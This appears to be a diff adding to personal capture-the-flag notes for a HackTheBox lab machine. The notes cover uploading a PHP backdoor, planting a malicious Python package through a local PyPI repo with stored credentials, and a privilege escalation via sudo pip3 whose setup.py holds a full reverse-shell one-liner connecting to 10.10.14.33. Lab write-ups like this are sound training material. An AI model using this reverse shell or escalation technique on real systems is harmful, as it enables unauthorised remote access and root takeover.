@@ -136,3 +136,45 @@ filezilla:
   Password: m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
   put php backdoor
   visit the dev.sneakycorp.htb/shell.php
+
+How the heck do i get my malicious package onto the server?
+  on victim host:
+    change home directory
+      HOME=/tmp/.kun
+
+    put a .pypirc in home
+      this must define a local repo
+        [distutils]
+        index-servers=
+          local
+
+        [local]
+        repository: http://pypi.sneakycorp.htb:8080/
+        username: pypi
+        password: soufianeelhaoui
+
+    create a setup.py file to execute as low user... so you can write into low's fs
+
+    wget setup.py and .pypirc into the temp folder and build the package
+      python3 setup.py sdist register -r local upload -r local
+
+    this will execute setup.py and write into lows fs bc setup has a write file op
+      will only work with python3 try/except.
+      try/except will allow you to bypass the failure when developer user tries
+        to write to low's file. Low's script will run setup though and cause
+        the file to write to its ssh stuff.
+
+ROOT: https://root4loot.com/post/pip-install-privilege-escalation/
+  Follow the link, but do something simpler by just calling:
+    p = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.33\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    os.system(p)
+
+  Matching Defaults entries for low on sneakymailer:                                                        
+      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+                                                                                                            
+  User low may run the following commands on sneakymailer:                                                  
+      (root) NOPASSWD: /usr/bin/pip3                                                                        
+
+  sudo -H /usr/bin/pip3 install . --upgrade --force-reinstall
+    create a setup.py file and exploit root
+    the sudo command will run the setup file
